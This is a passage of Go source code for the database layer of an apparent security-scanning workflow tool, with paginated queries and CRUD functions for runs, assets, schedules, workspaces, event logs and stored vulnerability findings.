		"input_config", "is_enabled", "last_run", "next_run", "run_count",
		"created_at", "updated_at"},
	"workspaces": {"id", "name", "local_path", "total_assets", "total_subdomains",
		"total_urls", "total_vulns", "vuln_critical", "vuln_high",
		"vuln_medium", "vuln_low", "vuln_potential", "risk_score", "tags",
		"last_run", "run_workflow", "created_at", "updated_at"},
	"vulnerabilities": {"id", "workspace", "vuln_info", "vuln_title", "vuln_desc",
		"vuln_poc", "severity", "asset_type", "asset_value", "tags",
		"detail_http_request", "detail_http_response", "raw_vuln_json",
		"created_at", "updated_at"},
}

// GetAllTableColumns returns ALL columns for a table (for column selection UI)
func GetAllTableColumns(tableName string) []string {
	if cols, ok := tableAllColumns[tableName]; ok {
		return cols
	}
	return nil
}

// GetTableColumns returns the display columns for a table
func GetTableColumns(tableName string) []string {
	if cols, ok := tableDisplayColumns[tableName]; ok {
		return cols
	}
	// Fallback to search columns if no display columns defined
	if cols, ok := tableSearchColumns[tableName]; ok {
		return cols
	}
	return nil
}

// GetTableRecords returns paginated records from a specific table with optional filters and search
func GetTableRecords(ctx context.Context, tableName string, offset, limit int, filters map[string]string, search string) (*TableRecords, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &TableRecords{
		Table:  tableName,
		Offset: offset,
		Limit:  limit,
	}

	searchCols := tableSearchColumns[tableName]

	// Helper to apply filters and search to a query
	applyFilters := func(query *bun.SelectQuery) *bun.SelectQuery {
		// Apply exact filters
		for key, value := range filters {
			query = query.Where("? = ?", bun.Ident(key), value)
		}
		// Apply search across columns (OR conditions)
		if search != "" && len(searchCols) > 0 {
			searchPattern := "%" + search + "%"
			query = query.WhereGroup(" AND ", func(sq *bun.SelectQuery) *bun.SelectQuery {
				for i, col := range searchCols {
					if i == 0 {
						sq = sq.Where("LOWER(CAST(? AS TEXT)) LIKE LOWER(?)", bun.Ident(col), searchPattern)
					} else {
						sq = sq.WhereOr("LOWER(CAST(? AS TEXT)) LIKE LOWER(?)", bun.Ident(col), searchPattern)
					}
				}
				return sq
			})
		}
		return query
	}

	switch tableName {
	case "runs":
		var records []Run
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "step_results":
		var records []StepResult
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "artifacts":
		var records []Artifact
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "assets":
		var records []Asset
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "event_logs":
		var records []EventLog
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "schedules":
		var records []Schedule
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "workspaces":
		var records []Workspace
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	case "vulnerabilities":
		var records []Vulnerability
		countQuery := applyFilters(db.NewSelect().Model(&records))
		count, err := countQuery.Count(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to count records: %w", err)
		}
		result.TotalCount = count
		fetchQuery := applyFilters(db.NewSelect().Model(&records))
		err = fetchQuery.Order("created_at DESC").Offset(offset).Limit(limit).Scan(ctx)
		if err != nil {
			return nil, fmt.Errorf("failed to fetch records: %w", err)
		}
		result.Records = records

	default:
		return nil, fmt.Errorf("unknown table: %s (valid tables: %v)", tableName, ValidTableNames())
	}

	return result, nil
}

// AssetQuery holds query parameters for listing assets
type AssetQuery struct {
	Workspace  string
	Search     string
	StatusCode int
	Offset     int
	Limit      int
}

// AssetResult holds paginated asset results
type AssetResult struct {
	Data       []Asset
	TotalCount int
	Offset     int
	Limit      int
}

// ListAssets returns paginated assets with optional filters
func ListAssets(ctx context.Context, query AssetQuery) (*AssetResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &AssetResult{
		Offset: query.Offset,
		Limit:  query.Limit,
	}

	// Helper to apply filters to a query
	applyFilters := func(q *bun.SelectQuery) *bun.SelectQuery {
		if query.Workspace != "" {
			q = q.Where("workspace = ?", query.Workspace)
		}
		if query.Search != "" {
			searchPattern := "%" + query.Search + "%"
			q = q.WhereGroup(" AND ", func(sq *bun.SelectQuery) *bun.SelectQuery {
				return sq.
					Where("asset_value LIKE ?", searchPattern).
					WhereOr("url LIKE ?", searchPattern).
					WhereOr("title LIKE ?", searchPattern).
					WhereOr("host_ip LIKE ?", searchPattern)
			})
		}
		if query.StatusCode > 0 {
			q = q.Where("status_code = ?", query.StatusCode)
		}
		return q
	}

	// Get total count
	countQuery := db.NewSelect().Model((*Asset)(nil))
	countQuery = applyFilters(countQuery)
	count, err := countQuery.Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count assets: %w", err)
	}
	result.TotalCount = count

	// Get paginated results
	baseQuery := db.NewSelect().Model(&result.Data)
	baseQuery = applyFilters(baseQuery)
	err = baseQuery.
		Order("created_at DESC").
		Offset(query.Offset).
		Limit(query.Limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch assets: %w", err)
	}

	return result, nil
}

type ArtifactQuery struct {
	Workspace  string
	Search     string
	StatusCode int
	Offset     int
	Limit      int
}

type ArtifactResult struct {
	Data       []Artifact
	TotalCount int
	Offset     int
	Limit      int
}

func ListArtifacts(ctx context.Context, query ArtifactQuery) (*ArtifactResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &ArtifactResult{
		Offset: query.Offset,
		Limit:  query.Limit,
	}

	applyFilters := func(q *bun.SelectQuery) *bun.SelectQuery {
		if query.Workspace != "" {
			q = q.Where("workspace = ?", query.Workspace)
		}
		if query.Search != "" {
			searchPattern := "%" + query.Search + "%"
			q = q.WhereGroup(" AND ", func(sq *bun.SelectQuery) *bun.SelectQuery {
				return sq.
					Where("id LIKE ?", searchPattern).
					WhereOr("run_id LIKE ?", searchPattern).
					WhereOr("workspace LIKE ?", searchPattern).
					WhereOr("name LIKE ?", searchPattern).
					WhereOr("artifact_path LIKE ?", searchPattern).
					WhereOr("artifact_type LIKE ?", searchPattern).
					WhereOr("content_type LIKE ?", searchPattern).
					WhereOr("description LIKE ?", searchPattern)
			})
		}
		return q
	}

	countQuery := db.NewSelect().Model((*Artifact)(nil))
	countQuery = applyFilters(countQuery)
	count, err := countQuery.Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count artifacts: %w", err)
	}
	result.TotalCount = count

	baseQuery := db.NewSelect().Model(&result.Data)
	baseQuery = applyFilters(baseQuery)
	err = baseQuery.
		Order("created_at DESC").
		Offset(query.Offset).
		Limit(query.Limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch artifacts: %w", err)
	}

	return result, nil
}

// WorkspaceInfo holds workspace information
type WorkspaceInfo struct {
	Name       string `json:"name"`
	AssetCount int    `json:"asset_count"`
}

// WorkspaceResult holds paginated workspace results
type WorkspaceResult struct {
	Data       []WorkspaceInfo
	TotalCount int
	Offset     int
	Limit      int
}

// ListWorkspacesFromDB returns unique workspaces from assets table with asset counts
// This is used when filesystem=true to show workspaces derived from asset data
func ListWorkspacesFromDB(ctx context.Context, offset, limit int) (*WorkspaceResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &WorkspaceResult{
		Offset: offset,
		Limit:  limit,
	}

	// Get total count of unique workspaces
	var totalCount int
	err := db.NewSelect().
		Model((*Asset)(nil)).
		ColumnExpr("COUNT(DISTINCT workspace)").
		Scan(ctx, &totalCount)
	if err != nil {
		return nil, fmt.Errorf("failed to count workspaces: %w", err)
	}
	result.TotalCount = totalCount

	// Get paginated unique workspaces with asset counts
	var workspaces []WorkspaceInfo
	err = db.NewSelect().
		Model((*Asset)(nil)).
		ColumnExpr("workspace AS name").
		ColumnExpr("COUNT(*) AS asset_count").
		Group("workspace").
		Order("workspace ASC").
		Offset(offset).
		Limit(limit).
		Scan(ctx, &workspaces)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch workspaces: %w", err)
	}
	result.Data = workspaces

	return result, nil
}

func ListAllWorkspacesFromAssets(ctx context.Context) ([]WorkspaceInfo, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	var workspaces []WorkspaceInfo
	err := db.NewSelect().
		Model((*Asset)(nil)).
		ColumnExpr("workspace AS name").
		ColumnExpr("COUNT(*) AS asset_count").
		Group("workspace").
		Order("workspace ASC").
		Scan(ctx, &workspaces)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch workspaces: %w", err)
	}

	return workspaces, nil
}

// FullWorkspaceResult holds paginated results from the workspaces table
type FullWorkspaceResult struct {
	Data       []Workspace `json:"data"`
	TotalCount int         `json:"total_count"`
	Offset     int         `json:"offset"`
	Limit      int         `json:"limit"`
}

// ListWorkspacesFullFromDB returns workspaces from the workspaces table with full details
func ListWorkspacesFullFromDB(ctx context.Context, offset, limit int) (*FullWorkspaceResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &FullWorkspaceResult{
		Offset: offset,
		Limit:  limit,
	}

	// Get total count
	totalCount, err := db.NewSelect().
		Model((*Workspace)(nil)).
		Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count workspaces: %w", err)
	}
	result.TotalCount = totalCount

	// Get paginated workspaces with full details
	var workspaces []Workspace
	err = db.NewSelect().
		Model(&workspaces).
		Order("name ASC").
		Offset(offset).
		Limit(limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch workspaces: %w", err)
	}
	result.Data = workspaces

	return result, nil
}

// UpsertWorkspace creates or updates a workspace record
func UpsertWorkspace(ctx context.Context, workspace *Workspace) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	// Check if workspace exists
	existing := new(Workspace)
	err := db.NewSelect().
		Model(existing).
		Where("name = ?", workspace.Name).
		Scan(ctx)

	if err == nil {
		// Update existing workspace
		workspace.ID = existing.ID
		workspace.CreatedAt = existing.CreatedAt
		_, err = db.NewUpdate().
			Model(workspace).
			WherePK().
			Exec(ctx)
		return err
	}

	// Insert new workspace
	_, err = db.NewInsert().
		Model(workspace).
		Exec(ctx)
	return err
}

// GetWorkspaceByName retrieves a workspace by name
func GetWorkspaceByName(ctx context.Context, name string) (*Workspace, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	workspace := new(Workspace)
	err := db.NewSelect().
		Model(workspace).
		Where("name = ?", name).
		Scan(ctx)
	if err != nil {
		return nil, err
	}
	return workspace, nil
}

// ScheduleResult holds paginated schedule results
type ScheduleResult struct {
	Data       []Schedule `json:"data"`
	TotalCount int        `json:"total_count"`
	Offset     int        `json:"offset"`
	Limit      int        `json:"limit"`
}

// CreateScheduleInput holds input for creating a schedule
type CreateScheduleInput struct {
	Name         string
	WorkflowName string
	WorkflowKind string
	Target       string
	Schedule     string
	Enabled      bool
}

// UpdateScheduleInput holds input for updating a schedule
type UpdateScheduleInput struct {
	Name     string
	Target   string
	Schedule string
	Enabled  *bool
}

// ListSchedules returns paginated schedules
func ListSchedules(ctx context.Context, offset, limit int) (*ScheduleResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &ScheduleResult{
		Offset: offset,
		Limit:  limit,
	}

	// Get total count
	totalCount, err := db.NewSelect().
		Model((*Schedule)(nil)).
		Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count schedules: %w", err)
	}
	result.TotalCount = totalCount

	// Get paginated schedules
	var schedules []Schedule
	err = db.NewSelect().
		Model(&schedules).
		Order("created_at DESC").
		Offset(offset).
		Limit(limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch schedules: %w", err)
	}
	result.Data = schedules

	return result, nil
}

// GetScheduleByID returns a schedule by ID
func GetScheduleByID(ctx context.Context, id string) (*Schedule, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	var schedule Schedule
	err := db.NewSelect().
		Model(&schedule).
		Where("id = ?", id).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("schedule not found: %w", err)
	}

	return &schedule, nil
}

// CreateSchedule creates a new schedule
func CreateSchedule(ctx context.Context, input CreateScheduleInput) (*Schedule, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	schedule := &Schedule{
		ID:           generateID(),
		Name:         input.Name,
		WorkflowName: input.WorkflowName,
		TriggerType:  "cron",
		TriggerName:  input.Name,
		Schedule:     input.Schedule,
		IsEnabled:    input.Enabled,
		CreatedAt:    time.Now(),
		UpdatedAt:    time.Now(),
	}

	_, err := db.NewInsert().Model(schedule).Exec(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to create schedule: %w", err)
	}

	return schedule, nil
}

// UpdateSchedule updates an existing schedule
func UpdateSchedule(ctx context.Context, id string, input UpdateScheduleInput) (*Schedule, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	// Get existing schedule
	schedule, err := GetScheduleByID(ctx, id)
	if err != nil {
		return nil, err
	}

	// Update fields if provided
	if input.Name != "" {
		schedule.Name = input.Name
		schedule.TriggerName = input.Name
	}
	if input.Schedule != "" {
		schedule.Schedule = input.Schedule
	}
	if input.Enabled != nil {
		schedule.IsEnabled = *input.Enabled
	}
	schedule.UpdatedAt = time.Now()

	_, err = db.NewUpdate().
		Model(schedule).
		WherePK().
		Exec(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to update schedule: %w", err)
	}

	return schedule, nil
}

// DeleteSchedule deletes a schedule by ID
func DeleteSchedule(ctx context.Context, id string) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	result, err := db.NewDelete().
		Model((*Schedule)(nil)).
		Where("id = ?", id).
		Exec(ctx)
	if err != nil {
		return fmt.Errorf("failed to delete schedule: %w", err)
	}

	rowsAffected, _ := result.RowsAffected()
	if rowsAffected == 0 {
		return fmt.Errorf("schedule not found")
	}

	return nil
}

// UpdateScheduleLastRun updates the last run time for a schedule
func UpdateScheduleLastRun(ctx context.Context, id string) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	now := time.Now()
	_, err := db.NewUpdate().
		Model((*Schedule)(nil)).
		Set("last_run = ?", now).
		Set("run_count = run_count + 1").
		Set("updated_at = ?", now).
		Where("id = ?", id).
		Exec(ctx)

	return err
}

// generateID generates a unique ID for schedules
func generateID() string {
	return fmt.Sprintf("sch_%d", time.Now().UnixNano())
}

// EventLogResult holds paginated event log results
type EventLogResult struct {
	Data       []EventLog `json:"data"`
	TotalCount int        `json:"total_count"`
	Offset     int        `json:"offset"`
	Limit      int        `json:"limit"`
}

// EventLogQuery holds query parameters for listing event logs
type EventLogQuery struct {
	Topic        string
	Name         string
	Source       string
	Workspace    string
	RunID        string
	WorkflowName string
	Processed    *bool
	Offset       int
	Limit        int
}

// ListEventLogs returns paginated event logs with optional filtering
func ListEventLogs(ctx context.Context, query EventLogQuery) (*EventLogResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &EventLogResult{
		Offset: query.Offset,
		Limit:  query.Limit,
	}

	// Build base query
	baseQuery := db.NewSelect().Model((*EventLog)(nil))

	// Apply filters
	if query.Topic != "" {
		baseQuery = baseQuery.Where("topic = ?", query.Topic)
	}
	if query.Name != "" {
		baseQuery = baseQuery.Where("name = ?", query.Name)
	}
	if query.Source != "" {
		baseQuery = baseQuery.Where("source = ?", query.Source)
	}
	if query.Workspace != "" {
		baseQuery = baseQuery.Where("workspace = ?", query.Workspace)
	}
	if query.RunID != "" {
		baseQuery = baseQuery.Where("run_id = ?", query.RunID)
	}
	if query.WorkflowName != "" {
		baseQuery = baseQuery.Where("workflow_name = ?", query.WorkflowName)
	}
	if query.Processed != nil {
		baseQuery = baseQuery.Where("processed = ?", *query.Processed)
	}

	// Get total count with filters
	totalCount, err := baseQuery.Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count event logs: %w", err)
	}
	result.TotalCount = totalCount

	// Get paginated event logs
	var eventLogs []EventLog
	err = db.NewSelect().
		Model(&eventLogs).
		Apply(func(q *bun.SelectQuery) *bun.SelectQuery {
			if query.Topic != "" {
				q = q.Where("topic = ?", query.Topic)
			}
			if query.Name != "" {
				q = q.Where("name = ?", query.Name)
			}
			if query.Source != "" {
				q = q.Where("source = ?", query.Source)
			}
			if query.Workspace != "" {
				q = q.Where("workspace = ?", query.Workspace)
			}
			if query.RunID != "" {
				q = q.Where("run_id = ?", query.RunID)
			}
			if query.WorkflowName != "" {
				q = q.Where("workflow_name = ?", query.WorkflowName)
			}
			if query.Processed != nil {
				q = q.Where("processed = ?", *query.Processed)
			}
			return q
		}).
		Order("created_at DESC").
		Offset(query.Offset).
		Limit(query.Limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch event logs: %w", err)
	}
	result.Data = eventLogs

	return result, nil
}

// VulnerabilityQuery holds query parameters for listing vulnerabilities
type VulnerabilityQuery struct {
	Workspace  string
	Severity   string
	Confidence string
	AssetValue string
	Offset     int
	Limit      int
}

// VulnerabilityResult holds paginated vulnerability results
type VulnerabilityResult struct {
	Data       []Vulnerability `json:"data"`
	TotalCount int             `json:"total_count"`
	Offset     int             `json:"offset"`
	Limit      int             `json:"limit"`
}

// ListVulnerabilities returns paginated vulnerabilities with optional filtering
func ListVulnerabilities(ctx context.Context, query VulnerabilityQuery) (*VulnerabilityResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &VulnerabilityResult{
		Offset: query.Offset,
		Limit:  query.Limit,
	}

	// Build base query
	baseQuery := db.NewSelect().Model((*Vulnerability)(nil))

	// Apply filters
	if query.Workspace != "" {
		baseQuery = baseQuery.Where("workspace = ?", query.Workspace)
	}
	if query.Severity != "" {
		baseQuery = baseQuery.Where("severity = ?", query.Severity)
	}
	if query.Confidence != "" {
		baseQuery = baseQuery.Where("confidence = ?", query.Confidence)
	}
	if query.AssetValue != "" {
		baseQuery = baseQuery.Where("asset_value LIKE ?", "%"+query.AssetValue+"%")
	}

	// Get total count with filters
	totalCount, err := baseQuery.Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count vulnerabilities: %w", err)
	}
	result.TotalCount = totalCount

	// Get paginated vulnerabilities
	var vulnerabilities []Vulnerability
	err = db.NewSelect().
		Model(&vulnerabilities).
		Apply(func(q *bun.SelectQuery) *bun.SelectQuery {
			if query.Workspace != "" {
				q = q.Where("workspace = ?", query.Workspace)
			}
			if query.Severity != "" {
				q = q.Where("severity = ?", query.Severity)
			}
			if query.AssetValue != "" {
				q = q.Where("asset_value LIKE ?", "%"+query.AssetValue+"%")
			}
			return q
		}).
		Order("created_at DESC").
		Offset(query.Offset).
		Limit(query.Limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch vulnerabilities: %w", err)
	}
	result.Data = vulnerabilities

	return result, nil
}

// GetVulnerabilityByID returns a vulnerability by ID
func GetVulnerabilityByID(ctx context.Context, id int64) (*Vulnerability, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	var vuln Vulnerability
	err := db.NewSelect().
		Model(&vuln).
		Where("id = ?", id).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("vulnerability not found: %w", err)
	}

	return &vuln, nil
}

// CreateVulnerabilityRecord creates a new vulnerability in the database
func CreateVulnerabilityRecord(ctx context.Context, vuln *Vulnerability) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	_, err := db.NewInsert().Model(vuln).Exec(ctx)
	if err != nil {
		return fmt.Errorf("failed to create vulnerability: %w", err)
	}

	return nil
}

// DeleteVulnerabilityByID deletes a vulnerability by ID
func DeleteVulnerabilityByID(ctx context.Context, id int64) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	result, err := db.NewDelete().
		Model((*Vulnerability)(nil)).
		Where("id = ?", id).
		Exec(ctx)
	if err != nil {
		return fmt.Errorf("failed to delete vulnerability: %w", err)
	}

	rowsAffected, _ := result.RowsAffected()
	if rowsAffected == 0 {
		return fmt.Errorf("vulnerability not found")
	}

	return nil
}

// GetVulnerabilitySummary returns a summary of vulnerabilities by severity for a workspace
func GetVulnerabilitySummary(ctx context.Context, workspace string) (map[string]int, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	var results []struct {
		Severity string `bun:"severity"`
		Count    int    `bun:"count"`
	}

	query := db.NewSelect().
		Model((*Vulnerability)(nil)).
		ColumnExpr("severity, COUNT(*) AS count").
		Group("severity")

	if workspace != "" {
		query = query.Where("workspace = ?", workspace)
	}

	err := query.Scan(ctx, &results)
	if err != nil {
		return nil, fmt.Errorf("failed to get vulnerability summary: %w", err)
	}

	summary := make(map[string]int)
	for _, r := range results {
		summary[r.Severity] = r.Count
	}

	return summary, nil
}

// RunResult holds paginated run results
type RunResult struct {
	Data       []Run `json:"data"`
	TotalCount int   `json:"total_count"`
	Offset     int   `json:"offset"`
	Limit      int   `json:"limit"`
}

// ListRuns returns paginated runs with optional filters
func ListRuns(ctx context.Context, offset, limit int, status, workflow, target string) (*RunResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	result := &RunResult{
		Offset: offset,
		Limit:  limit,
	}

	query := db.NewSelect().Model((*Run)(nil))

	if status != "" {
		query = query.Where("status = ?", status)
	}
	if workflow != "" {
		query = query.Where("workflow_name = ?", workflow)
	}
	if target != "" {
		query = query.Where("target LIKE ?", "%"+target+"%")
	}

	totalCount, err := query.Count(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to count runs: %w", err)
	}
	result.TotalCount = totalCount

	var runs []Run
	err = db.NewSelect().
		Model(&runs).
		Apply(func(q *bun.SelectQuery) *bun.SelectQuery {
			if status != "" {
				q = q.Where("status = ?", status)
			}
			if workflow != "" {
				q = q.Where("workflow_name = ?", workflow)
			}
			if target != "" {
				q = q.Where("target LIKE ?", "%"+target+"%")
			}
			return q
		}).
		Order("created_at DESC").
		Offset(offset).
		Limit(limit).
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch runs: %w", err)
	}
	result.Data = runs

	return result, nil
}

// GetRunByID returns a run by ID with optional relations
func GetRunByID(ctx context.Context, id string, includeSteps, includeArtifacts bool) (*Run, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	var run Run
	query := db.NewSelect().Model(&run).Where("id = ? OR run_id = ?", id, id)

	if includeSteps {
		query = query.Relation("Steps")
	}
	if includeArtifacts {
		query = query.Relation("Artifacts")
	}

	err := query.Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("run not found: %w", err)
	}

	return &run, nil
}

// GetRunsByJobID returns all runs for a given job ID
func GetRunsByJobID(ctx context.Context, jobID string) ([]*Run, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}
	if jobID == "" {
		return nil, fmt.Errorf("job ID is required")
	}

	var runs []*Run
	err := db.NewSelect().
		Model(&runs).
		Where("job_id = ?", jobID).
		Order("created_at ASC").
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to get runs by job ID: %w", err)
	}

	return runs, nil
}

// CreateRun creates a new run record in the database
func CreateRun(ctx context.Context, run *Run) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	now := time.Now()
	run.CreatedAt = now
	run.UpdatedAt = now
	if run.Status == "" {
		run.Status = "pending"
	}

	_, err := db.NewInsert().Model(run).Exec(ctx)
	if err != nil {
		return fmt.Errorf("failed to create run: %w", err)
	}

	return nil
}

// UpdateRunStatus updates the status of a run
func UpdateRunStatus(ctx context.Context, id, status, errorMessage string) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	now := time.Now()
	query := db.NewUpdate().
		Model((*Run)(nil)).
		Set("status = ?", status).
		Set("updated_at = ?", now).
		Where("id = ? OR run_id = ?", id, id)

	if errorMessage != "" {
		query = query.Set("error_message = ?", errorMessage)
	}

	if status == "completed" || status == "failed" || status == "cancelled" {
		query = query.Set("completed_at = ?", now)
	}

	// When completed, set completed_steps equal to total_steps
	if status == "completed" {
		query = query.Set("completed_steps = total_steps")
	}

	result, err := query.Exec(ctx)
	if err != nil {
		return fmt.Errorf("failed to update run status: %w", err)
	}

	rowsAffected, _ := result.RowsAffected()
	if rowsAffected == 0 {
		return fmt.Errorf("run not found")
	}

	return nil
}

// IncrementRunCompletedSteps increments the completed_steps counter for a run
func IncrementRunCompletedSteps(ctx context.Context, runID string) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	now := time.Now()
	result, err := db.NewUpdate().
		Model((*Run)(nil)).
		Set("completed_steps = completed_steps + 1").
		Set("updated_at = ?", now).
		Where("id = ? OR run_id = ?", runID, runID).
		Exec(ctx)
	if err != nil {
		return fmt.Errorf("failed to increment completed steps: %w", err)
	}

	rowsAffected, _ := result.RowsAffected()
	if rowsAffected == 0 {
		return fmt.Errorf("run not found")
	}

	return nil
}

// GetRunSteps returns step results for a run
func GetRunSteps(ctx context.Context, runID string) ([]StepResult, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	run, err := GetRunByID(ctx, runID, false, false)
	if err != nil {
		return nil, err
	}

	var steps []StepResult
	err = db.NewSelect().
		Model(&steps).
		Where("run_id = ?", run.ID).
		Order("created_at ASC").
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch steps: %w", err)
	}

	return steps, nil
}

// GetRunArtifacts returns artifacts for a run
func GetRunArtifacts(ctx context.Context, runID string) ([]Artifact, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	run, err := GetRunByID(ctx, runID, false, false)
	if err != nil {
		return nil, err
	}

	var artifacts []Artifact
	err = db.NewSelect().
		Model(&artifacts).
		Where("run_id = ?", run.ID).
		Order("created_at DESC").
		Scan(ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch artifacts: %w", err)
	}

	return artifacts, nil
}
